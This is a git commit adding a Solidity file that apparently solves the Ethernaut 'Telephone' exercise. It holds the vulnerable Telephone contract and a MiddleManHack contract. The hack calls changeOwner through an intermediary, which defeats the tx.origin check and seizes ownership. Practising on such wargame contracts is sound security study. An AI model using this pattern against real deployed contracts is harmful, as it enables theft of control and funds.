928f1dd39b32b565b0f691ad14578ee1c02cfd09
Vadym Shpet <vadik.shpet01@gmail.com>
2022-06-13 12:42:44 +0300

    added MiddleMan attack

---
+++ contracts/MiddleManHack.sol
@@ -0,0 +1,35 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+
+
+contract MiddleManHack{
+
+    address private _owner;
+    
+    constructor(){
+        _owner = msg.sender;
+    }
+
+    function hack(address _tel) public{
+        (bool success, ) = _tel.call(
+          abi.encodeWithSignature("changeOwner(address)", _owner)
+        );
+
+        require(success, "Hack is not success");
+    }
+}
